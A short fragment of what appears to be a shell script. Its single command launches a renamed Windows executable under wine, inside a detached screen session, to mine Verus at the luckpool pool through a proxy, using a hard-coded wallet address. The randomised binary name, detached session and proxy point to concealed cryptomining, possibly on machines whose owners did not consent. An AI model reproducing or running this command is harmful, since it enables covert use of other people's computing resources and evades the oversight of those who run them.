...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://eu.luckpool.net:3960 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.belotloh -p d=5 -t 4 --proxy=$proxy_url"
